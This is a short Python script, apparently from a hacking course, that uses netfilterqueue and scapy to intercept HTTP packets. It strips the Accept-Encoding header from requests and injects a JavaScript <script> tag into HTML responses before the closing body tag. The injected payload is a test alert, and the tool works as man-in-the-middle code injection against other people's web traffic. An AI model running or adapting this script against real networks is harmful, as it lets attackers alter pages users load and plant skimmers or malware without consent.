import netfilterqueue
import scapy.all as scapy
from scapy.layers.inet import IP, UDP, TCP
from scapy.layers.dns import DNSRR, DNSQR, DNS
import re


injected_script = "alert('test')"


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load

        # dport = destination port, sport = source port
        if scapy_packet[TCP].dport == 80:
            print('[+] Request')
            # remove accepted encoding from the request so that we receive pure HTTP code
            load = re.sub(r"Accept-Encoding:.*?\r\n", "", load)

        elif scapy_packet[TCP].sport == 80:
            print('[+] Response')
            print(scapy_packet.show())
            load = load.replace("</body>", f"<script>{injected_script};</script></body>")

        if load != scapy_packet[scapy.Raw].load:
            modified_packet = set_load(scapy_packet, load)
            packet.set_payload(str(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
